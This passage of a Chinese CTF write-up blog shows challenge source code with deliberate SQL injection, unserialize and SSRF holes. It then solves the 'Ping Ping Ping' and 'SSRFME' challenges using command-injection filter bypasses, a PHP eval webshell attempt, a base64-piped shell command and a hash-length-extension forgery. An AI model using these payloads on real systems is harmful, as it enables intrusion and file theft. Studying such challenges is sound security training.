class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php session_start(); ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;db.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;user.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;error.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$db = new DB();</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;ko&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot;</span><br><span class=\"line\">          content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;User&lt;/title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;?php require_once &apos;bootstrap.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$no = $_GET[&apos;no&apos;];</span><br><span class=\"line\">if ($db-&gt;anti_sqli($no))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    die(&quot;no hack ~_~&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$res = $db-&gt;getUserByNo($no);</span><br><span class=\"line\">$user = unserialize($res[&apos;data&apos;]);</span><br><span class=\"line\">//print_r($res);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;table class=&quot;table&quot;&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                username</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                age</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                blog</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $res[&apos;username&apos;]; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $user-&gt;age; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo xss($user-&gt;blog); ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">    &lt;/table&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">    $response = $user-&gt;getBlogContents();</span><br><span class=\"line\">    if ($response === 404)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &quot;404 Not found&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $base64 = base64_encode($response);</span><br><span class=\"line\">        echo &quot;&lt;iframe width=&apos;100%&apos; height=&apos;10em&apos; src=&apos;data:text/html;base64,&#123;$base64&#125;&apos;&gt;&quot;;</span><br><span class=\"line\">        // echo $response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // var_dump($user-&gt;getBlogContents());</span><br><span class=\"line\">    ?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>db.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &apos;lib.php&apos;;</span><br><span class=\"line\">$mysqli = new mysqli(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;naiwjebfahjebfja&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">class DB &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction __construct() &#123;</span><br><span class=\"line\">\t\t// $mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;!@#1234!@#&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function isValidUsername($username) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res-&gt;fetch_array()) &#123;</span><br><span class=\"line\">\t\t\treturn 1;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction login($username, $passwd) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos; and passwd = &apos;&#123;$passwd&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_array();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction insertUser($username, $passwd, $data) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = substr($username, 0, 100);</span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$data = serialize($data);</span><br><span class=\"line\">\t\t$data = addslashes($data);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;insert into users (username, passwd, data) values (&apos;&#123;$username&#125;&apos;, &apos;&#123;$passwd&#125;&apos;, &apos;&#123;$data&#125;&apos;)&quot;;</span><br><span class=\"line\">\t\treturn $mysqli-&gt;real_query($query);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getAllUsers() &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;select * from users&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\treturn $res-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getUserByNo($no) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// $no = addslashes($no);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where no = &#123;$no&#125;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res) &#123;</span><br><span class=\"line\">\t\t\techo &quot;&lt;p&gt;[*] query error! (&#123;$mysqli-&gt;error&#125;)&lt;/p&gt;&quot;;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_assoc();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function anti_sqli($no) &#123;</span><br><span class=\"line\">\t\t$patterns = &quot;/union\\Wselect|0x|hex/i&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn preg_match($patterns, $no);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\">CREATE TABLE `users` ( `no` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(100) NOT NULL , `passwd` VARCHAR(128) NOT NULL , `data` TEXT NOT NULL , PRIMARY KEY (`no`)) ENGINE = MyISAM;</span><br><span class=\"line\"></span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Ping-Ping-Ping\"><a href=\"#Ping-Ping-Ping\" class=\"headerlink\" title=\"Ping Ping Ping\"></a>Ping Ping Ping</h3><h4 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h4><p>先测试什么能用</p>\n<p>过滤<code>&#39; 、&quot; 、 {}、空格、[]、*、?</code>、/</p>\n<p>绕过空格可以 <code>${IFS},$IFS,</code></p>\n<p>这里 <code>$IFS</code> 绕过空格</p>\n<p><code>127.0.0.1;ls$IFS-l</code> 看到 flag.php。 尝试读 <code>127.0.0.1;cat$IFSflag.php</code>,过滤了 <code>flag</code> 关键字，尝试传马</p>\n<p> <code>;echo -e &quot;&lt;?php @eval(\\$_POST[122]);?&gt;&quot; &gt; 233.php</code> </p>\n<p>但是因为过滤了引号，也失败了。现在只能尝试构造关键字 flag 。</p>\n<p>尝试内联执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;a=f;b=ag;c=l;cat$IFS$a$c$b.php</span><br></pre></td></tr></table></figure>\n\n<p>这里需要注意定义变量的顺序 <code>acd</code> 就会被检测出含有 flag。</p>\n<p>执行完查看源代码即可。</p>\n<p>还可以编码绕过：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh ==&gt; cat flag.php</span><br></pre></td></tr></table></figure>\n\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/silence1_/article/details/96135760\" target=\"_blank\" rel=\"noopener\">命令注入绕过</a></p>\n<h3 id=\"SSRFME\"><a href=\"#SSRFME\" class=\"headerlink\" title=\"SSRFME\"></a>SSRFME</h3><p>源码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):     </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码可知：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/De1ta 从我们传入的url 和 cookie中得到参数 -&gt; waf() 禁用敏感协议 -&gt; Task() -&gt; Exec()</span><br><span class=\"line\"></span><br><span class=\"line\">-&gt; 先检查Sign-checkSign()</span><br><span class=\"line\">     getSign(self.action, self.param) == self.sign</span><br><span class=\"line\">     hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\">        </span><br><span class=\"line\">-&gt; 判断动作</span><br><span class=\"line\">\tscan-<span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action <span class=\"comment\"># 注意是 in</span></span><br><span class=\"line\">    </span><br><span class=\"line\">       tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">       resp = scan(self.param)</span><br><span class=\"line\">           urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">           <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">           tmpfile.write(resp)</span><br><span class=\"line\">        </span><br><span class=\"line\">\tread-<span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">       f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">       result[<span class=\"string\">'data'</span>] = f.read()</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们要先通过 <code>checkSign()</code> 的检查以后才能进行下一步。而在代码中专门给出一个路由，将生成的 Sign 发送给用户，也就是告诉了我们加密的结果。</p>\n<p>于是，我知道了 md5 加密的一个结果，从 <code>hashlib.md5(secert_key + param + action).hexdigest()</code> 以及 <code>secert_key</code> 长度已知，可以使用 <code>hash extend attack</code> 来构造合适的<code>sign</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Input Signature: <span class=\"number\">9</span>f1d78f610b5e32249e30d1161ff4e81</span><br><span class=\"line\">Input Data: local_file:flag.txtscan</span><br><span class=\"line\">Input Key Length: <span class=\"number\">16</span></span><br><span class=\"line\">Input Data to Add: read</span><br><span class=\"line\"><span class=\"number\">4</span>a0fa89f8745038437386ca78367e28d</span><br><span class=\"line\">local_file:flag.txtscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x008\\x01\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p>我们注意到要得到文件的内容需要 read in action , 于是我们填充 read 。</p>\n<p>payload.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 